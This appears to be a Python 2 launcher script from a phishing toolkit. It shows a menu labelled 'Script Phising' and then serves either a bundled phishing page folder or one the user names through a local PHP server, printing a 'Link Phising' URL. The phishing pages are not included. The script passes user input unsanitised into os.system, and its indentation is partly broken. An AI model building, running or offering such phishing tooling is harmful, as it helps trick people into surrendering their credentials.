#coding=utf-8
# Tebas index html
# Github : https://github.com/Rubetu-Xcan
# Youtube : CANDRA - NM
# Mode By Rubetu Xcan
import os,sys,time,re,requests,json
from requests import post
from time import sleep
import itertools
import threading
def intro(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.002)
        
def succes(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.002)
        
def succes1(s):
    for c in s + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.002)

def spin():
        try:
                L="/-\\|"
                for q in range(20):
                        time.sleep(1.0)
                        sys.stdout.write("\r\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mPlease Wait...\033[1;32m"+L[q % len(L)]+"")
                        sys.stdout.flush()
        except:
                exit()
                
os.system('clear')
intro("""\033[1;37m╦═╗╗ ╔╔╦╗╔═╗╗ ╔   ╗ ╔╔╦╗╔╦╗═╗
\033[1;37m╠═╝╠═╣ ║ ╚═╗╠═╣   ╠═╣ ║ ║║║ ║
\033[1;37m╩  ╝ ╚╚╩╝╚═╝╝ ╚   ╝ ╚ ╩ ╩ ╩ ╚═╝ 
\033[1;37m│\033[41;1m \033[1;37mBy: RubetuXcan |  Versi: 1.0 \033[00m\033[1;37m│
\033[1;37m────────────────────────────────
\033[1;31m[\033[1;37m01\033[1;31m]\033[1;31m • \033[1;37mDefaunt Script Phising
\033[1;31m[\033[1;37m02\033[1;31m]\033[1;31m • \033[1;37mScript Phising Sendiri
\033[1;31m[\033[1;37m00\033[1;31m]\033[1;31m • \033[1;37mExit
\033[1;37m────────────────────────────────""")
pilih = raw_input("\033[1;31m • \033[1;37mChoice \033[1;31m: \033[0;32m")
if pilih == '1' or pilih == '01':
	port = raw_input("\033[1;31m • \033[1;37mMasukan Port\033[1;31m : \033[0;32m")
	if port == '':
		print('\033[1;31m • \033[1;37mLink Phising\033[1;31m : \033[1;31m Failed!')
		time.sleep(2)
		os.system('python2 xcan.py')
	else:
		succes('\033[1;31m • \033[1;37mLink Phising\033[1;31m :\033[0;32m http://localhost:' + port)
		os.system('php -S localhost:' + port + ' -t rubetu')
	
if pilih == '2' or pilih == '02':
	port = raw_input("\033[1;31m • \033[1;37mMasukan Port\033[1;31m : \033[0;32m")
	if port == '':
		print('\033[1;31m •\033[1;31m Failed!')
		time.sleep(2)
		os.system('python2 xcan.py')
	file = raw_input("\033[1;31m • \033[1;37mLokasi Forder Script\033[1;31m : \033[0;32m")
	if file == '':
		print('\033[1;31m • \033[1;37mLink Phising\033[1;31m : \033[1;31m Failed!')
		time.sleep(2)
		os.system('python2 xcan.py')
	else:
		succes1('\033[1;31m • \033[1;37mLink Phising\033[1;31m :\033[0;32m http://localhost:' + port)
	        os.system('php -S localhost:' + port + ' -t ' + file)
	
if pilih == '0' or pilih == '00':
	       sys.exit('\033[1;37m[\033[1;32m•\033[1;37m] \033[1;37mExit Program')
if pilih == '':
	       print('\033[1;31m • \033[1;37m\033[1;31mWrong Input!')
	       time.sleep(0.1)
	       os.system('python2 xcan.py')